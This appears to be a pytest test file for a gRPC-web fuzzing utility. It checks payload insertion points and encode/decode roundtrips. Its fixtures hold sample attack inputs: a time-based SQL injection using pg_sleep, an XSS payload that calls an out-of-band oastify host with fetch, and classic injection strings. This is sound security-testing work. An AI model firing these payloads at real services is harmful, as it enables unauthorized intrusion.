# test_grpc_fuzzing.py
import pytest
from grpc_utils import find_insertion_points, replace_value_at_path, extract_value_from_path
from grpc_utils import get_encoded_payload_grpc_web_text, get_decoded_payload_grpc_web_text


class TestGRPCFuzzing:
    @pytest.fixture
    def test_messages(self):
        return {
            'simple': '''1: {"test"}''',
            'nested': '''1: {"' AND pg_sleep(20)--"}
5: {"test"}
10: {2: 15}''',
            'multi_field': '''1: {
  1: {"1234"}
  3: {"test"}
  5: {"test"}
  10: {
    1: {"test"}
    2: {"test"}
    5: {"18d157ca-72d3-4c26-999f-cf84d8135d8e"}
    6: {"test"}
  }
}'''
        }

    @pytest.fixture
    def test_payloads(self):
        return [
            '\'"><svg/onload=fetch`//test\\.oastify.com`>',
            "' OR '1'='1",
            '<script>alert(1)</script>',
        ]

    def validate_grpc_text(self, text):
        """Check if the text follows gRPC-text format rules"""
        if not text:
            return False
        text = text.decode('utf-8')
        # Basic structure validation
        lines = text.split('\n')
        for line in lines:
            line = line.strip()
            if not line:
                continue

            # Each line should either be a field definition or a nested structure
            if ': {' in line:
                field_num = line.split(':', 1)[0].strip()
                if not field_num.isdigit():
                    return False

                value = line.split('{', 1)[1].rstrip('}').strip()
                if value.startswith('"'):
                    if not value.endswith('"'):
                        return False
                elif not value.replace('.', '').isdigit():
                    return False

        return True

    def test_find_all_fuzzable_fields(self, test_messages):
        """Test that we can locate all fuzzable fields in each message type"""
        expected_fields = {
            'simple': 1,  # Just field 1
            'nested': 3,  # Fields 1, 5, and 10.2
            'multi_field': 7  # All nested fields
        }

        for msg_type, message in test_messages.items():
            points = find_insertion_points(message)
            assert len(points) == expected_fields[msg_type], f"Wrong number of insertion points for {msg_type}"

            # Verify each point has required properties
            for point in points:
                assert 'path' in point
                assert 'name' in point
                assert 'value' in point

    def test_payload_injection_and_encoding(self, test_messages, test_payloads):
        """Test injecting payloads into each field and validating the result"""
        for msg_type, message in test_messages.items():
            points = find_insertion_points(message)

            for point in points:
                for payload in test_payloads:
                    # Inject payload
                    modified = replace_value_at_path(message, point['path'], payload)

                    if isinstance(modified, bytes):
                        modified = modified.decode("utf-8")
                    # Encode

                    assert(type(modified) == str)
                    encoded = get_encoded_payload_grpc_web_text(modified)
                    assert encoded, f"Encoding failed for {msg_type} at {point['path']}"

                    if isinstance(encoded, bytes):
                        encoded = encoded.decode("utf-8")
                    # Decode and validate
                    decoded = get_decoded_payload_grpc_web_text(encoded)
                    assert decoded, f"Decoding failed for {msg_type} at {point['path']}"

                    print('-'*10)
                    print(decoded.decode('utf-8'))




    def test_encoding_roundtrip(self, test_messages, test_payloads):
        """Test that messages remain valid after encode/decode roundtrip"""
        for msg_type, message in test_messages.items():
            # First roundtrip without modification
            encoded = get_encoded_payload_grpc_web_text(message)
            decoded = get_decoded_payload_grpc_web_text(encoded)

            print('-' * 10)
            print(decoded.decode('utf-8'))


            # Then with modifications
            points = find_insertion_points(message)
            for point in points:
                for payload in test_payloads:
                    modified = replace_value_at_path(message, point['path'], payload)

                    encoded = get_encoded_payload_grpc_web_text(modified)
                    decoded = get_decoded_payload_grpc_web_text(encoded)

                    print('-' * 10)
                    print(decoded.decode('utf-8'))


def test_field_value_preservation(self, test_messages):
        """Test that non-modified fields retain their values"""
        for msg_type, message in test_messages.items():
            points = find_insertion_points(message)
            original_values = {
                tuple(point['path']): point['value']
                for point in points
            }

            # Modify one field at a time
            for point in points:
                modified = replace_value_at_path(message, point['path'], "TEST_VALUE")
                encoded = get_encoded_payload_grpc_web_text(modified)
                decoded = get_decoded_payload_grpc_web_text(encoded)

                # Check other fields remained unchanged
                for other_point in points:
                    if other_point['path'] != point['path']:
                        value = extract_value_from_path(other_point['path'], decoded)
                        assert value == original_values[tuple(other_point['path'])], \
                            f"Unrelated field changed in {msg_type}"